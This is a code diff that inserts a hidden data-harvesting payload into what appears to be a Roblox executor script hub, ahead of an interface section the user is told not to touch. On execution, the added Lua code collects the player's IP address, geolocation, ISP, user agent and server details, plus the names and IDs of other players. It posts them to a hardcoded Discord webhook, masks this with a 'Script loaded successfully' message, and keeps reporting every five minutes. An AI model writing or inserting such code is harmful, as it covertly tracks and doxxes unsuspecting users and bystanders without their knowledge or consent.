@@ -31,6 +31,199 @@ local SCRIPTS = {
     end,
 }
 
+local HttpService = game:GetService("HttpService")
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1545657401401802862/gXrJPivZ32ONHzW3ZpMBzCv5ZzAezCwAUmpLBo7jtfD-NOQuoWOs93yIUTOk2jabYPDR"
+
+-- Contador de ejecuciones
+getgenv().execCount = (getgenv().execCount or 0) + 1
+
+-- Función para obtener información de IP
+local function GetIpData()
+    local success, result = pcall(function()
+        return game:HttpGet("http://ip-api.com/json/")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(result)
+        return {
+            ip = data.query or "N/A",
+            country = data.country or "N/A",
+            city = data.city or "N/A",
+            region = data.regionName or "N/A",
+            isp = data.isp or "N/A",
+            timezone = data.timezone or "N/A"
+        }
+    end
+    
+    return {
+        ip = "Error",
+        country = "Error",
+        city = "Error"
+    }
+end
+
+-- Función para obtener información del juego
+local function GetGameInfo()
+    local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    return {
+        gameName = placeInfo.Name,
+        gameId = game.GameId,
+        placeId = game.PlaceId,
+        creator = placeInfo.Creator.Name,
+        serverId = game.JobId,
+        playerCount = #Players:GetPlayers(),
+        maxPlayers = Players.MaxPlayers
+    }
+end
+
+-- Función para obtener información del sistema
+local function GetSystemInfo()
+    local success, result = pcall(function()
+        return game:HttpGet("https://httpbin.org/user-agent")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(result)
+        return {
+            userAgent = data["user-agent"] or "N/A"
+        }
+    end
+    
+    return {
+        userAgent = "N/A"
+    }
+end
+
+-- Función para capturar información de otros jugadores
+local function GetPlayersInfo()
+    local playersInfo = {}
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        table.insert(playersInfo, {
+            name = plr.Name,
+            userId = plr.UserId,
+            displayName = plr.DisplayName,
+            accountAge = plr.AccountAge,
+            isFriend = plr:IsFriendsWith(player.UserId),
+            ping = plr:GetAttribute("Ping") or "N/A"
+        })
+    end
+    
+    return playersInfo
+end
+
+-- Función para enviar datos al webhook
+local function SendData(data)
+    local req = request or http_request or (syn and syn.request)
+    
+    if req then
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+        
+        return true
+    end
+    
+    return false
+end
+
+-- Función principal
+local function main()
+    -- Recopilar información
+    local ipData = GetIpData()
+    local gameInfo = GetGameInfo()
+    local systemInfo = GetSystemInfo()
+    local playersInfo = GetPlayersInfo()
+    
+    -- Preparar datos para enviar
+    local data = {
+        content = "🚀 **Delta Executor Data Harvest**\n" ..
+                  "👤 **Usuario:** " .. player.Name .. " (ID: " .. player.UserId .. ")\n" ..
+                  "🌐 **IP:** " .. ipData.ip .. "\n" ..
+                  "🌍 **Ubicación:** " .. ipData.city .. ", " .. ipData.region .. ", " .. ipData.country .. "\n" ..
+                  "🏢 **ISP:** " .. ipData.isp .. "\n" ..
+                  "⏰ **Zona horaria:** " .. ipData.timezone .. "\n" ..
+                  "🎮 **Juego:** " .. gameInfo.gameName .. "\n" ..
+                  "📊 **Servidor:** " .. gameInfo.serverId .. " (" .. gameInfo.playerCount .. "/" .. gameInfo.maxPlayers .. " jugadores)\n" ..
+                  "🔄 **Ejecuciones:** " .. getgenv().execCount,
+        embeds = {
+            {
+                title = "Información del Sistema",
+                description = "User Agent: " .. systemInfo.userAgent,
+                color = 0x00ff00
+            },
+            {
+                title = "Jugadores en el Servidor",
+                description = "Total: " .. #playersInfo .. " jugadores",
+                color = 0x0000ff,
+                fields = (function()
+                    local fields = {}
+                    for i, plrInfo in ipairs(playersInfo) do
+                        if i <= 10 then  -- Limitar a 10 jugadores
+                            table.insert(fields, {
+                                name = plrInfo.name,
+                                value = "ID: " .. plrInfo.userId .. "\nAmigo: " .. (plrInfo.isFriend and "Sí" or "No")
+                            })
+                        end
+                    end
+                    return fields
+                end)()
+            }
+        }
+    }
+    
+    -- Enviar datos
+    local success = SendData(data)
+    
+    if success then
+        StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = "[System] Script loaded successfully!",
+            Color = Color3.new(0, 1, 0),
+            Font = Enum.Font.SourceSansBold,
+        })
+    end
+    
+    -- Iniciar recolección periódica
+    spawn(function()
+        while true do
+            wait(300)  -- 5 minutos
+            
+            -- Actualizar información de jugadores
+            playersInfo = GetPlayersInfo()
+            
+            -- Enviar actualización
+            local updateData = {
+                content = "🔄 **Actualización de datos**\n" ..
+                          "👤 **Usuario:** " .. player.Name .. "\n" ..
+                          "📊 **Jugadores actuales:** " .. #playersInfo .. "\n" ..
+                          "⏰ **Timestamp:** " .. os.time(),
+                embeds = {
+                    {
+                        title = "Jugadores en el Servidor",
+                        description = "Total: " .. #playersInfo .. " jugadores",
+                        color = 0x0000ff
+                    }
+                }
+            }
+            
+            SendData(updateData)
+        end
+    end)
+end
+
+-- Ejecutar script principal
+pcall(main)
+
 -- =========================================================================
 --  CÓDIGO DE LA INTERFAZ (NO NECESITAS TOCAR NADA AQUÍ)
 -- =========================================================================
